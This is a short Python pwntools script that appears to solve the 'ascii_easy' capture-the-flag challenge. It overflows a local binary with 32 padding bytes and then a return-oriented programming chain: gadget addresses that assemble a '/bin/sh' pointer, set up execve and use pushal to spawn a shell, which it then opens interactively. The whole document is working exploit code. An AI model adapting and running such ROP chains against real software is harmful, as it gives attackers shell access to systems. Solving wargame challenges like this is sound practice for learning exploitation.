from pwn import *

# BINSH = BINSH1 + BINSH2 = 0x556bb7ec
BINSH1 = 0x32377479
BINSH2 = 0x23344373
NULLADDR = 0x556b2020
EXECVE = 0x5561676a

GADGET1 = 0x556a372d    # pop esi ; pop ebp ; pop ebx ; ret
GADGET2 = 0x555c612c    # add esi, ebx ; ret
GADGET3 = 0x5557506e    # pop edi ; pop ebp ; ret
GADGET4 = 0x5563704c    # pushal ; ret

payload = "A" * 32
payload += p32(GADGET1) + p32(BINSH1) + p32(NULLADDR) + p32(BINSH2)
payload += p32(GADGET2)
payload += p32(GADGET3) + p32(EXECVE) + p32(NULLADDR)
payload += p32(GADGET4)

p = process(['/home/ascii_easy/ascii_easy', payload])
p.interactive()
